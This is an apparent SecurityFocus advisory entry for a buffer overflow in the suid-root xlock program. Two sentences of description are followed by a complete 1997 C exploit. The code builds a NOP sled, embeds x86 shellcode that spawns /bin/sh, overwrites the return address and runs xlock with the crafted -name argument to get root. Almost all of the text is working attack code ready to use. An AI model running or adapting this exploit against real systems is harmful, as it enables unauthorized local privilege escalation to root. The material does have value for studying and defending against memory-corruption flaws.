source: http://www.securityfocus.com/bid/224/info

The xlock program is used to lock the local X display until the user supplies the correct password. A buffer overflow condition has been discovered in xlock that may allow an unauthorized user to gain root access. 

/*   x86 XLOCK overflow exploit
     by cesaro@0wned.org 4/17/97

     Original exploit framework - lpr exploit

     Usage: make xlock-exploit
            xlock-exploit  <optional_offset>

     Assumptions: xlock is suid root, and installed in /usr/X11/bin
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define DEFAULT_OFFSET          50
#define BUFFER_SIZE             996

long get_esp(void)
{
   __asm__("movl %esp,%eax\n");
}

int main(int argc, char *argv[])
{
   char *buff = NULL;

   unsigned long *addr_ptr = NULL;
   char *ptr = NULL;
   int dfltOFFSET = DEFAULT_OFFSET;

   u_char execshell[] =   "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07"
                          "\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12"
                          "\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8"
                          "\xd7\xff\xff\xff/bin/sh";
  int i;

   if (argc > 1)
      dfltOFFSET = atoi(argv[1]);
   else printf("You can specify another offset as a parameter if you 
need...\n");

   buff = malloc(4096);
   if(!buff)
   {
      printf("can't allocate memory\n");
      exit(0);
   }
   ptr = buff;
   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
   ptr += BUFFER_SIZE-strlen(execshell);
   for(i=0;i < strlen(execshell);i++)
      *(ptr++) = execshell[i];
   addr_ptr = (long *)ptr;
   for(i=0;i<2;i++)
      *(addr_ptr++) = get_esp() + dfltOFFSET;
   ptr = (char *)addr_ptr;
   *ptr = 0;
   execl("/usr/X11/bin/xlock", "xlock", "-nolock", "-name", buff, NULL);
}